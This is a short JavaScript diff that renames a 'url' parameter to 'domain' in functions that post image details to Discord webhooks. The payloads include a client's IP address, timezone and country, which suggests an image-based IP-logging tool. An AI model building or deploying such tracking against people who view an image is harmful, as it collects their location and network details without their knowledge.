@@ -6,7 +6,7 @@ const config = require('./config.json')
 const sendImageToWebhooks = (
   imageName,
   imageUrl,
-  url,
+  domain,
   clientIP,
   timezone,
   country,
@@ -25,7 +25,7 @@ const sendImageToWebhooks = (
 ) => {
   imageName = imageName || 'not found'
   imageUrl = imageUrl || 'not found'
-  url = url || 'not found'
+  domain = domain || 'not found'
   clientIP = clientIP || 'not found'
   timezone = timezone || 'not found'
   country = country || 'not found'
@@ -49,8 +49,8 @@ const sendImageToWebhooks = (
           value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
         },
         {
-          name: '🌐 URL',
-          value: `\`\`\`shell\n🔗 URL: ${url}\`\`\``
+          name: '🌐 Domain',
+          value: `\`\`\`shell\n🌐 Domain: ${domain}\`\`\``
         },
         {
           name: '📡 Network',
@@ -89,10 +89,10 @@ const sendImageToWebhooks = (
   })
 }
 
-const sendImageToWebhooksGithub = (imageName, imageUrl, url) => {
+const sendImageToWebhooksGithub = (imageName, imageUrl, domain) => {
   imageName = imageName || 'not found'
   imageUrl = imageUrl || 'not found'
-  url = url || 'not found'
+  domain = domain || 'not found'
 
   config.webhooks.forEach(webhook => {
     const webhookClient = new WebhookClient({ url: webhook.url })
@@ -104,8 +104,8 @@ const sendImageToWebhooksGithub = (imageName, imageUrl, url) => {
           value: `\`\`\`shell\n🖼️ Name: ${imageName}\n🔗 URL: ${imageUrl}\`\`\``
         },
         {
-          name: '🕸️ URL',
-          value: `\`\`\`shell\n🔗 URL: ${url}\`\`\``
+          name: '🌐 Domain',
+          value: `\`\`\`shell\n🌐 Domain: ${domain}\`\`\``
         }
       ])
       .setThumbnail('attachment://' + imageName)
